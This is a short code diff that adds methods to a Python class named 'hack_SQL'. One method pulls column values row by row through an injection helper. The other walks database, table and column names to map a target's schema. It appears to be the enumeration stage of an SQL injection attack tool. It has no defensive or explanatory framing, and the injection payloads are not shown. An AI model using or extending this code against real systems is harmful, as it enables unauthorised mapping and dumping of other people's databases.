@@ -29,3 +29,32 @@ class hack_SQL(App):
         except:
             r = ''
         return r
+
+    def SQLfindAll(self, column, table):
+        val = ""
+        arr = []
+        count = lst = 1
+        while val != lst:
+            lst = val
+            val = self.mysqli(column, table, count)
+            if val and lst!=val:
+                arr.append(val)
+                count += 1
+        return arr
+
+    def findDB(self):
+        KQ = self.getJSON(self.OBJ['dir_knownquery'])
+        EDB = self.getJSON(self.OBJ['dir_excludeddatabase'])
+        sys.stdout.write('\nLoading: ')
+        OBJ = {}
+        for K in range(0, len(KQ)):
+            for A in self.SQLfindAll(KQ[K][0][0],KQ[K][0][1]):
+                if A not in EDB[K]:
+                    for B in self.SQLfindAll(KQ[K][1][0], KQ[K][1][1].replace('<%tb%>', A)):
+                        OBJ.update({A+'.'+B:[]})
+                        for C in self.SQLfindAll(KQ[K][2][0], KQ[K][2][1].replace('<%tb%>', B)):
+                            OBJ[A+'.'+B].append(C)
+                            sys.stdout.write('.')
+                            sys.stdout.flush()
+        sys.stdout.write(' done!\n')
+        return OBJ
